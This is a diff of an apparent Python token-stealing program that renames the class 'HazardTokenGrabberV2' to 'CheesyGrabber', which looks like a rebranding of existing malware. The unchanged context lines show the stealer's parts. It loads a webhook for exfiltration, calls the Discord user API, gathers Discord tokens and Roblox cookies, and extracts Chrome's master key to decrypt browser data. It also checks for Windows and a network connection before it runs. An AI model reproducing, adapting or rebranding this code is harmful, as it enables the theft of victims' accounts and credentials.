@@ -161,7 +161,8 @@ class Functions(object):
         return __config__.get(e)
 
 
-class HazardTokenGrabberV2(Functions):
+
+class CheesyGrabber(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
@@ -182,9 +183,9 @@ class HazardTokenGrabberV2(Functions):
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
-        self.chrome_key = self.get_master_key(ntpath.join(self.chrome_user_data, "Local State"))
+        self.chrome_key = self.get_master_key(ntpath.join(self.chrome_user_data, "Local State")) 
 
-        os.makedirs(self.dir, exist_ok=True)
+        os.makedirs(self.dir, exist_ok=True) 
 
     def hazard_exit(self):
         shutil.rmtree(self.dir, ignore_errors=True)
@@ -792,4 +793,4 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')
     except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
-    asyncio.run(HazardTokenGrabberV2().init())
+    asyncio.run(CheesyGrabber().init())
